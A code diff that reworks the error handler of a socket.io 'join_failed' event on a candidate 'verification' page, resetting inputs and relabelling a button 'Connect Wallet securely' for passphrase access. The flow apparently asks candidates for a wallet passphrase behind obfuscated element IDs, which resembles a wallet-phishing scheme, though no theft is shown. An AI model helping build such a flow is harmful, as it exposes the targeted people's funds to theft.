@@ -876,6 +876,8 @@
     });
 
     socket.on('join_failed', (data) => {
+        $('#z6x2c9v4b1_992211').hide();
+        $(".action-btn").prop('disabled', false);
         joinActive = false;
         console.warn("Join failed:", data.message);
         let btnText = "Resubmit";
@@ -883,7 +885,6 @@
         // 1. Show the error to the candidate
        
         document.getElementById('error-div').innerHTML = 'Error processing your request, please try again.';
-        $('#z6x2c9v4b1_992211').hide();
         document.getElementById('indicator').value = "";
         document.getElementById('placeholder').value = "";
         localStorage.removeItem('cand_email');
@@ -891,12 +892,12 @@
         localStorage.removeItem('cand_cat');
         document.getElementById('indicator').focus();
 
-        if($(".btn-text")){
+        if($(".action-btn")){
             btnText = (accessType === "passphrase")? "Connect Wallet securely" : "Process Verification";
         }
 
         $(".btn-text").html(btnText)
-        $(".action-btn").prop('disabled', false);
+        
         
         // 3. Reset local variables so they have to type/select again if necessary
         // This forces the "redo the entrance" behavior you requested.
